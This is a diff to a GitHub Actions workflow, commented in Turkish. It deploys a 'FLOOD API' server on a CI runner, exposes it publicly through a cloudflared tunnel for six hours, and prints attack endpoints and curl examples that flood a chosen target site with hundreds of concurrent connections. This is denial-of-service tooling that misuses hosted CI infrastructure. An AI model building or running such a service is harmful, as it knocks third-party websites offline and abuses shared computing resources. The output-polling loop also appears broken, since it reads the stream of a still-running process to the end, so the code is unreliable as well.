@@ -382,51 +382,94 @@ jobs:
     - name: Start Server
       run: |
         cd C:\flood-api
-        node server.js &
+        Start-Process -FilePath "node" -ArgumentList "server.js" -WindowStyle Hidden
         Start-Sleep -Seconds 5
         echo "Server started on port 3000"
 
     - name: Download Cloudflared
       run: |
         Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
-    
-    - name: Start Cloudflared
+
+    - name: Start Cloudflared and Get URL
+      shell: powershell
       run: |
-        .\cloudflared.exe tunnel --url http://localhost:3000 &
-        Start-Sleep -Seconds 10
+        # Cloudflared'ı arka planda başlat
+        $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+        $pinfo.FileName = ".\cloudflared.exe"
+        $pinfo.Arguments = "tunnel --url http://localhost:3000"
+        $pinfo.RedirectStandardOutput = $true
+        $pinfo.RedirectStandardError = $true
+        $pinfo.UseShellExecute = $false
+        $pinfo.CreateNoWindow = $true
+        $p = New-Object System.Diagnostics.Process
+        $p.StartInfo = $pinfo
+        $p.Start() | Out-Null
         
-        # Get tunnel URL
-        $tunnelUrl = (.\cloudflared.exe tunnel --url http://localhost:3000 2>&1 | Select-String -Pattern "https://[a-zA-Z0-9-]+\.trycloudflare\.com" | ForEach-Object { $_ -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' > $null; $matches[0] }) | Select-Object -First 1
+        # URL'yi bulana kadar bekle
+        $tunnelUrl = $null
+        $timeout = 30
+        $timer = 0
         
-        Write-Host "============================================"
-        Write-Host "     FLOOD API SERVER HAZIR!"
-        Write-Host "============================================"
+        while ($timer -lt $timeout -and $tunnelUrl -eq $null) {
+            Start-Sleep -Seconds 2
+            $timer += 2
+            
+            # Cloudflared çıktısını oku
+            $output = $p.StandardOutput.ReadToEnd()
+            $errorOutput = $p.StandardError.ReadToEnd()
+            $allOutput = $output + $errorOutput
+            
+            # URL'yi ara
+            $matches = [regex]::Matches($allOutput, 'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
+            if ($matches.Count -gt 0) {
+                $tunnelUrl = $matches[0].Value
+            }
+            
+            Write-Host "Bekleniyor... ($timer saniye)" -NoNewline
+            Write-Host "`r" -NoNewline
+        }
+        
+        Clear-Host
+        Write-Host "============================================" -ForegroundColor Green
+        Write-Host "     🚀 FLOOD API SERVER HAZIR! 🚀" -ForegroundColor Cyan
+        Write-Host "============================================" -ForegroundColor Green
         Write-Host ""
+        
         if ($tunnelUrl) {
-            Write-Host "PUBLIC URL: $tunnelUrl"
+            Write-Host "🌐 PUBLIC URL: $tunnelUrl" -ForegroundColor Yellow
             Write-Host ""
-            Write-Host "API ENDPOINTS:"
-            Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200"
-            Write-Host "   ${tunnelUrl}/stop"
-            Write-Host "   ${tunnelUrl}/status"
+            Write-Host "📡 API ENDPOINTS:" -ForegroundColor Magenta
+            Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200" -ForegroundColor White
+            Write-Host "   ${tunnelUrl}/stop" -ForegroundColor White
+            Write-Host "   ${tunnelUrl}/status" -ForegroundColor White
+            Write-Host ""
+            Write-Host "💡 Ornek Kullanim:" -ForegroundColor Green
+            Write-Host "   curl ${tunnelUrl}/attack?url=https://hedefsite.com&concurrent=300" -ForegroundColor Gray
+            Write-Host "   curl ${tunnelUrl}/status" -ForegroundColor Gray
+            Write-Host "   curl ${tunnelUrl}/stop" -ForegroundColor Gray
         } else {
-            Write-Host "Cloudflared baslatiliyor... LUTFEN BEKLEYIN"
-            Write-Host "Cloudflare URL'si icin loglari kontrol edin"
+            Write-Host "⚠️ Cloudflare URL bulunamadi!" -ForegroundColor Red
+            Write-Host ""
+            Write-Host "Manuel olarak cloudflared loglarini kontrol edin:" -ForegroundColor Yellow
+            Write-Host "   Get-Content .\cloudflared.log" -ForegroundColor Gray
         }
         Write-Host ""
-        Write-Host "============================================"
+        Write-Host "============================================" -ForegroundColor Green
+        Write-Host "⏱️  Server 6 saat boyunca aktif kalacak" -ForegroundColor Yellow
+        Write-Host "============================================" -ForegroundColor Green
 
     - name: Keep Alive
       run: |
-        Write-Host "Server 6 saat boyunca calisacak..."
+        Write-Host "`n🔄 Server 6 saat boyunca calisacak..." -ForegroundColor Green
         $timeout = 21600
         $elapsed = 0
         while ($elapsed -lt $timeout) {
             try {
                 $response = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction Stop
-                Write-Host "Status: Running=$($response.running) | RPS=$($response.rps) | Total=$($response.totalRequests)"
+                $running = if ($response.running) { "Aktif" } else { "Beklemede" }
+                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] Status: $running | RPS: $($response.rps) | Total: $($response.totalRequests)" -ForegroundColor Green
             } catch {
-                Write-Host "Status check failed" -ForegroundColor Yellow
+                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] ⚠️ Status check failed" -ForegroundColor Yellow
             }
             Start-Sleep -Seconds 15
             $elapsed += 15
